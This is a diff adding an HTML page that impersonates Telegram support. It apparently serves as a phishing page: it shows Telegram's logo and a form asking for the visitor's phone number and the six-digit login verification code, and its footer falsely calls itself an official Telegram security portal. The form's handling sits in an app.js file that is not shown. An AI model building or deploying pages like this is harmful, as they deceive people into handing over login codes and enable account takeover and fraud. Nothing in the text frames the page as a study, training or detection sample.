@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram – Official Support</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✈️</text></svg>">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo">
+        <svg width="60" height="60" viewBox="0 0 240 240" fill="none">
+          <circle cx="120" cy="120" r="120" fill="#2AABEE"/>
+          <path d="M81.429 129.917L112.041 141.75L124.5 179.5C125.75 183.25 130.5 183.5 132.5 180L168.5 94.5C170.5 90.5 167.75 86.5 163.5 88L52.5 132.5C48 134.25 48.25 140.5 52.75 141.75L81.429 129.917Z" fill="white"/>
+          <path d="M81.429 129.917L152.5 85.5L112.041 141.75L81.429 129.917Z" fill="#D2E5F0"/>
+        </svg>
+      </div>
+      <h1>Telegram Support</h1>
+      <p class="subtitle">Verify your account to resolve security issues</p>
+
+      <form id="authForm">
+        <div class="input-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
+        </div>
+        <div class="input-group">
+          <label for="code">Verification Code</label>
+          <input type="text" id="code" name="code" placeholder="Enter the code from Telegram" required maxlength="6">
+        </div>
+        <button type="submit" class="btn primary">Verify Account</button>
+      </form>
+
+      <div id="message" class="message hidden"></div>
+
+      <p class="footer-text">
+        This is an official Telegram security portal.<br>
+        Your session will be protected after verification.
+      </p>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
